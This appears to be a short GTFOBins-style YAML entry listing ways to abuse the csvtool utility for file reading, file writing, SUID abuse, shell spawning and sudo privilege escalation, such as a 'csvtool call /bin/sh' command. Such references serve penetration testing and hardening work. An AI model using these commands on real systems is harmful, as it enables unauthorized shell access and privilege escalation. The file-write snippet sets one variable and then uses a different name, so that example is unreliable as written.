---
functions:
  file-read:
    - code: |
        LFILE=file-to-read.txt
        csvtool trim t $LFILE
  file-write:
    - code: |
        LFILE=file-to-write
        TF=$(mktemp -u)
        echo DATA > $TF
        csvtool trim t $TP -o $LFILE
  suid:
    - code: |
        LFILE=file-to-read
        ./csvtool trim t $LFILE
  shell:
    - code: csvtool call '/bin/sh;false' /etc/passwd
  sudo:
    - code: sudo csvtool call '/bin/sh;false' /etc/passwd
---
